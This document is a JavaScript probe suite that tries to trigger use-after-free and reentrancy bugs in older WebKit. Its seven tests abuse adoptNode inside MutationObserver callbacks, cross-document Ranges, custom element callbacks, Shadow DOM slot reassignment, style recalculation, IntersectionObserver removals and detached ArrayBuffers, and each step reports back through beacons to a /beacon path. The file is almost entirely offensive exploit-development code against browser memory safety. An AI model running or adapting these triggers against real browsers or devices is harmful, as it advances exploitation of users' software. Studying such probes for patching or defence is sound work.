// p205 — DOM UAF probe suite targeting WebKit-1200 era bugs
//
// Multiple CVE patterns that affect non-JIT WebKit:
// - TreeScope/Node adoption during mutation events
// - Range manipulation during DOM mutations
// - Custom element callback reentrancy
// - ShadowDOM slot reassignment during insertion
// - CSS style invalidation during tree modification
//
// Beacon prefix: V205-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V205-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var tests = [];
  var currentTest = 0;

  // ── TEST A: adoptNode during MutationObserver callback ──
  tests.push({name: 'A-ADOPT-MO', run: function(done) {
    try {
      var iframe = document.createElement('iframe');
      iframe.srcdoc = '<html><body><div id="target"></div></body></html>';
      document.body.appendChild(iframe);

      iframe.onload = function() {
        var idoc = iframe.contentDocument;
        var target = idoc.getElementById('target');
        B('A-IFRAME-READY');

        // Create deep tree in iframe
        var parent = target;
        var nodes = [target];
        for (var i = 0; i < 50; i++) {
          var child = idoc.createElement('div');
          child.setAttribute('data-idx', i);
          parent.appendChild(child);
          nodes.push(child);
          parent = child;
        }
        B('A-TREE-BUILT');

        var moFired = 0;
        var mo = new MutationObserver(function(mutations) {
          moFired++;
          if (moFired === 1) {
            B('A-MO-FIRST');
            // During MO callback for tree modification,
            // adopt a subtree into the main document
            try {
              var adopted = document.adoptNode(nodes[25]);
              document.body.appendChild(adopted);
              B('A-ADOPTED-OK');
            } catch (e) {
              B('A-ADOPT-ERR-' + e.name);
            }
          }
        });
        mo.observe(target, {childList: true, subtree: true});

        // Trigger mutation by removing the tree
        target.removeChild(nodes[1]);
        B('A-REMOVED');

        setTimeout(function() {
          B('A-MO-COUNT-' + moFired);
          mo.disconnect();
          try { document.body.removeChild(iframe); } catch(e) {}
          done();
        }, 1000);
      };
    } catch (e) {
      B('A-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST B: Range across documents after adoptNode ──
  tests.push({name: 'B-RANGE-ADOPT', run: function(done) {
    try {
      var iframe = document.createElement('iframe');
      iframe.srcdoc = '<html><body><p id="p1">Hello</p><p id="p2">World</p></body></html>';
      document.body.appendChild(iframe);

      iframe.onload = function() {
        var idoc = iframe.contentDocument;
        var p1 = idoc.getElementById('p1');
        var p2 = idoc.getElementById('p2');
        B('B-IFRAME-READY');

        // Create range spanning both paragraphs
        var range = idoc.createRange();
        range.setStart(p1.firstChild, 2);
        range.setEnd(p2.firstChild, 3);
        B('B-RANGE-SET');

        // Adopt the start node into main document
        var adopted = document.adoptNode(p1);
        document.body.appendChild(adopted);
        B('B-ADOPTED-START');

        // Try to use the range (start node is now in different doc)
        try {
          var contents = range.cloneContents();
          B('B-CLONE-OK-' + contents.childNodes.length);
        } catch (e) {
          B('B-CLONE-ERR-' + e.name);
        }

        // Try to extract
        try {
          var extracted = range.extractContents();
          B('B-EXTRACT-OK-' + extracted.childNodes.length);
        } catch (e) {
          B('B-EXTRACT-ERR-' + e.name);
        }

        // Try surroundContents
        try {
          range.setStart(p1.firstChild, 0);
          range.setEnd(p1.firstChild, 2);
          var wrapper = document.createElement('span');
          range.surroundContents(wrapper);
          B('B-SURROUND-OK');
        } catch (e) {
          B('B-SURROUND-ERR-' + e.name);
        }

        try { document.body.removeChild(iframe); } catch(e) {}
        try { document.body.removeChild(adopted); } catch(e) {}
        done();
      };
    } catch (e) {
      B('B-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST C: Custom Element connectedCallback reentrancy ──
  tests.push({name: 'C-CE-REENTRY', run: function(done) {
    try {
      var callbackCount = 0;
      var crashed = false;

      // Define custom element that modifies DOM in connectedCallback
      var tagName = 'test-c-' + Date.now();
      customElements.define(tagName, class extends HTMLElement {
        connectedCallback() {
          callbackCount++;
          if (callbackCount === 1) {
            B('C-CONNECTED-1');
            // Create and append another custom element during callback
            var nested = document.createElement(tagName);
            this.appendChild(nested);

            // Remove ourselves while nested is being connected
            try {
              this.parentNode.removeChild(this);
              B('C-SELF-REMOVED');
            } catch (e) {
              B('C-SELF-REMOVE-ERR');
            }
          } else if (callbackCount <= 5) {
            B('C-CONNECTED-' + callbackCount);
          }
        }

        disconnectedCallback() {
          if (callbackCount < 5) {
            B('C-DISCONNECTED');
            // Re-add ourselves during disconnection
            try {
              document.body.appendChild(this);
            } catch (e) {
              B('C-READD-ERR');
            }
          }
        }
      });

      var el = document.createElement(tagName);
      document.body.appendChild(el);
      B('C-APPENDED');

      setTimeout(function() {
        B('C-CALLBACKS-' + callbackCount);
        // Cleanup
        try {
          var elements = document.querySelectorAll(tagName);
          elements.forEach(function(e) { e.remove(); });
        } catch(e) {}
        done();
      }, 2000);
    } catch (e) {
      B('C-ERR-' + (e.name || e));
      done();
    }
  }});

  // ── TEST D: ShadowDOM slot reassignment during insertion ──
  tests.push({name: 'D-SLOT-REASSIGN', run: function(done) {
    try {
      var host = document.createElement('div');
      document.body.appendChild(host);
      var shadow = host.attachShadow({mode: 'open'});

      // Create two slots
      var slot1 = document.createElement('slot');
      slot1.name = 'a';
      var slot2 = document.createElement('slot');
      slot2.name = 'b';
      shadow.appendChild(slot1);
      shadow.appendChild(slot2);

      // Add slotted content
      var slotted = [];
      for (var i = 0; i < 20; i++) {
        var el = document.createElement('span');
        el.slot = 'a';
        el.textContent = 'S' + i;
        host.appendChild(el);
        slotted.push(el);
      }
      B('D-SETUP-DONE');

      // MutationObserver on shadow root
      var moFired = 0;
      var mo = new MutationObserver(function() {
        moFired++;
        if (moFired === 1) {
          B('D-MO-FIRST');
          // During MO callback, reassign slots
          for (var j = 0; j < slotted.length; j++) {
            slotted[j].slot = (j % 2 === 0) ? 'b' : 'a';
          }
          B('D-REASSIGNED');

          // Remove a slot while content is assigned
          shadow.removeChild(slot1);
          B('D-SLOT-REMOVED');
        }
      });
      mo.observe(shadow, {childList: true, subtree: true});

      // Trigger by adding to shadow
      var div = document.createElement('div');
      shadow.appendChild(div);

      setTimeout(function() {
        B('D-MO-COUNT-' + moFired);
        // Check slot assignments
        try {
          var assigned = slot2.assignedNodes();
          B('D-SLOT2-ASSIGNED-' + assigned.length);
        } catch (e) {
          B('D-SLOT2-ERR-' + e.name);
        }

        mo.disconnect();
        host.remove();
        done();
      }, 1000);
    } catch (e) {
      B('D-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST E: CSS style recalc during tree mutation ──
  tests.push({name: 'E-STYLE-RECALC', run: function(done) {
    try {
      // Create a complex styled tree
      var container = document.createElement('div');
      container.id = 'test-e-container';
      document.body.appendChild(container);

      var style = document.createElement('style');
      style.textContent = [
        '#test-e-container div { color: red; transition: all 0.1s; }',
        '#test-e-container .highlight { background: yellow; }',
        '#test-e-container:has(.active) div { color: blue; }',
        '#test-e-container div:nth-child(odd) { font-size: 14px; }',
        '#test-e-container div:nth-child(even) { font-size: 16px; }'
      ].join('\n');
      document.head.appendChild(style);

      var divs = [];
      for (var i = 0; i < 100; i++) {
        var d = document.createElement('div');
        d.textContent = 'Item ' + i;
        d.className = (i % 3 === 0) ? 'highlight' : '';
        container.appendChild(d);
        divs.push(d);
      }
      B('E-TREE-BUILT');

      // Force style recalc
      var _ = container.offsetHeight;

      // During ResizeObserver callback, heavily modify the tree
      var ro = new ResizeObserver(function(entries) {
        B('E-RESIZE-FIRED');

        // Batch DOM mutations during style recalc
        for (var j = divs.length - 1; j >= 50; j--) {
          container.removeChild(divs[j]);
        }
        B('E-REMOVED-50');

        // Add new nodes
        for (var k = 0; k < 50; k++) {
          var nd = document.createElement('div');
          nd.className = 'active';
          container.insertBefore(nd, container.firstChild);
        }
        B('E-INSERTED-50');

        // Force computed style access during mutation
        try {
          var cs = getComputedStyle(divs[0]);
          B('E-COMPUTED-COLOR-' + cs.color.substring(0, 10));
        } catch (e) {
          B('E-COMPUTED-ERR-' + e.name);
        }

        ro.disconnect();
      });
      ro.observe(container);

      // Trigger resize by changing size
      container.style.width = '500px';

      setTimeout(function() {
        style.remove();
        container.remove();
        done();
      }, 2000);
    } catch (e) {
      B('E-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST F: content-visibility:auto + tree modification ──
  tests.push({name: 'F-CV-TREE', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'height: 100px; overflow: auto;';
      document.body.appendChild(container);

      // Create content with content-visibility
      for (var i = 0; i < 50; i++) {
        var section = document.createElement('div');
        section.style.cssText = 'content-visibility: auto; contain-intrinsic-size: 100px;';
        section.textContent = 'Section ' + i;
        container.appendChild(section);
      }
      B('F-SECTIONS-BUILT');

      // IntersectionObserver to detect visibility changes
      var ioFired = 0;
      var io = new IntersectionObserver(function(entries) {
        ioFired += entries.length;
        if (ioFired <= 5) {
          // During IO callback, remove observed elements
          entries.forEach(function(entry) {
            if (entry.target.parentNode) {
              entry.target.parentNode.removeChild(entry.target);
            }
          });
          B('F-IO-REMOVED-' + entries.length);
        }
      }, {root: container});

      // Observe all sections
      Array.from(container.children).forEach(function(child) {
        io.observe(child);
      });

      // Scroll to trigger visibility changes
      container.scrollTop = 500;

      setTimeout(function() {
        B('F-IO-FIRED-' + ioFired);
        io.disconnect();
        container.remove();
        done();
      }, 2000);
    } catch (e) {
      B('F-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST G: Worker + structuredClone of complex objects ──
  tests.push({name: 'G-WORKER-CLONE', run: function(done) {
    try {
      // Create objects with complex prototypes
      var ab1 = new ArrayBuffer(1024);
      var view1 = new Uint32Array(ab1);
      for (var i = 0; i < 256; i++) view1[i] = 0x41414141;

      var ab2 = new ArrayBuffer(1024);
      var view2 = new Float64Array(ab2);
      for (var i = 0; i < 128; i++) view2[i] = 1.1;

      B('G-BUFFERS-READY');

      // Transfer ArrayBuffer to worker then immediately detach
      var workerCode = 'onmessage=function(e){postMessage({len:e.data.buf.byteLength,ok:true});}';
      var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
      var worker = new Worker(URL.createObjectURL(workerBlob));

      worker.onmessage = function(ev) {
        B('G-WORKER-RESP-' + JSON.stringify(ev.data));
        worker.terminate();
        done();
      };
      worker.onerror = function(ev) {
        B('G-WORKER-ERR');
        worker.terminate();
        done();
      };

      // Transfer ab1 (detaches it)
      worker.postMessage({buf: ab1}, [ab1]);
      B('G-TRANSFERRED');

      // Try to use detached buffer
      try {
        var v = new Uint8Array(ab1);
        B('G-DETACHED-VIEW-LEN-' + v.length);
      } catch (e) {
        B('G-DETACHED-ERR-' + e.name);
      }

      // Try to transfer already-transferred buffer
      try {
        worker.postMessage({buf: ab1}, [ab1]);
        B('G-DOUBLE-TRANSFER-OK');
      } catch (e) {
        B('G-DOUBLE-TRANSFER-ERR-' + e.name);
      }

      setTimeout(function() {
        worker.terminate();
        done();
      }, 3000);
    } catch (e) {
      B('G-ERR-' + e.name);
      done();
    }
  }});

  // ── Run all tests sequentially ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }

    var t = tests[currentTest];
    currentTest++;
    B(t.name + '-START');

    var timedOut = false;
    var completed = false;

    var timeout = setTimeout(function() {
      if (!timedOut && !completed) {
        timedOut = true;
        B(t.name + '-TIMEOUT');
        runNext();
      }
    }, 10000);

    t.run(function() {
      if (!timedOut && !completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 300);
      }
    });
  }

  runNext();
})();
